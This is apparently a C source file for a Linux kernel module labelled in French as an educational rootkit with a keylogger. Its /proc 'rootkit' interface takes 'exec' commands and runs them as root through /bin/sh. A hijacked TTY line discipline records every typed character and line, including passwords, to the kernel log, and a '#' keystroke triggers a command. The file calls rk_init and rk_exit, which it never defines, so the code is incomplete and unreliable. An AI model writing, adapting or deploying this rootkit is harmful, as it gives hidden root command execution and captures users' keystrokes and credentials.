#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/string.h>
#include <linux/tty.h>
#include <linux/tty_ldisc.h>

#define PROC_NAME "rootkit"
#define BUFFER_SIZE 256
#define MY_LDISC  30

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Shayman");
MODULE_DESCRIPTION("Rootkit pedagogique avec keylogger");
MODULE_VERSION("0.1");

// Fonctions déclarées
void exec_user_cmd(const char *cmd);
ssize_t proc_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos);
ssize_t proc_read(struct file *file, char __user *ubuf, size_t len, loff_t *off);
static int my_ldisc_open(struct tty_struct *tty);
static void my_ldisc_close(struct tty_struct *tty);
static void my_receive_buf(struct tty_struct *tty, const u8 *cp, const u8 *fp, size_t count);

// Buffer ligne keylogger
static char line_buffer[256];
static int line_pos = 0;

static struct proc_dir_entry *proc_entry;

//----------------------------//
//        CMD EXECUTION      //
//----------------------------//

void exec_user_cmd(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=xterm",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    };

    printk(KERN_INFO "[rootkit] Execution de la commande : %s\n", cmd);
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    printk(KERN_INFO "[rootkit] Code retour : %d\n", ret);
}

//----------------------------//
//        /proc INTERFACE    //
//----------------------------//

ssize_t proc_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos) {
    char commande[BUFFER_SIZE] = {0};

    if (count > sizeof(commande) - 1)
        return -EINVAL;

    if (copy_from_user(commande, buffer, count))
        return -EFAULT;

    commande[count] = '\0';

    printk(KERN_INFO "[rootkit] Commande recue : %s\n", commande);

    if (strncmp(commande, "exec ", 5) == 0) {
        char *arg = commande + 5;
        if (*arg != '\0') {
            exec_user_cmd(arg);
        } else {
            printk(KERN_INFO "[rootkit] Aucune commande specifiee apres 'exec'\n");
        }
    }

    return count;
}

ssize_t proc_read(struct file *file, char __user *ubuf, size_t len, loff_t *off)
{
    char output[] = "rootkit: module pedagogique actif\n";
    return simple_read_from_buffer(ubuf, len, off, output, strlen(output));
}

static const struct proc_ops proc_fops = {
    .proc_read = proc_read,
    .proc_write = proc_write,
};

//----------------------------//
//       TTY LINE DISC       //
//----------------------------//

static int my_ldisc_open(struct tty_struct *tty) {
    printk(KERN_INFO "[keylogger] Ligne discipline ouverte\n");
    return 0;
}

static void my_ldisc_close(struct tty_struct *tty) {
    printk(KERN_INFO "[keylogger] Ligne discipline fermee\n");
}

static void my_receive_buf(struct tty_struct *tty, const u8 *cp, const u8 *fp, size_t count)
{
    size_t i;

    for (i = 0; i < count; i++) {
        char c = cp[i];
        printk(KERN_INFO "[keylogger] char: %c\n", c);

        if (c == '#') {
            exec_user_cmd("touch /tmp/secret_triggered");
        }

        if (c == '\r' || c == '\n') {
            line_buffer[line_pos] = '\0';
            printk(KERN_INFO "[keylogger] Ligne : %s\n", line_buffer);
            line_pos = 0;
        } else {
            if (line_pos < sizeof(line_buffer) - 1) {
                line_buffer[line_pos++] = c;
            }
        }
    }

    // Propagation à la discipline supérieure si nécessaire
    if (tty->ldisc && tty->ldisc->receive_buf) {
        tty->ldisc->receive_buf(tty, cp, fp, count);
    }
}

// Déclaration de la discipline
static struct tty_ldisc_ops my_ldisc = {
    .owner = THIS_MODULE,
    .name = "mykeylogger",
    .open = my_ldisc_open,
    .close = my_ldisc_close,
    .receive_buf = my_receive_buf,
};

//----------------------------//
//     MODULE INIT/EXIT      //
//----------------------------//

static int __init my_ldisc_init(void)
{
    int ret = tty_register_ldisc(MY_LDISC, &my_ldisc);
    if (ret) {
        printk(KERN_ERR "[keylogger] Erreur d'enregistrement de la discipline: %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "[keylogger] Ligne discipline enregistrée\n");
    return 0;
}

static void __exit my_ldisc_exit(void)
{
    int ret = tty_unregister_ldisc(MY_LDISC);
    if (ret)
        printk(KERN_ERR "[keylogger] Erreur de désenregistrement: %d\n", ret);
    else
        printk(KERN_INFO "[keylogger] Ligne discipline désenregistrée\n");
}

static int __init mymodule_init(void)
{
    int ret;

    ret = my_ldisc_init();
    if (ret)
        return ret;

    ret = rk_init();
    if (ret) {
        my_ldisc_exit();
        return ret;
    }

    return 0;
}

static void __exit mymodule_exit(void)
{
    rk_exit();
    my_ldisc_exit();
}

module_init(mymodule_init);
module_exit(mymodule_exit);
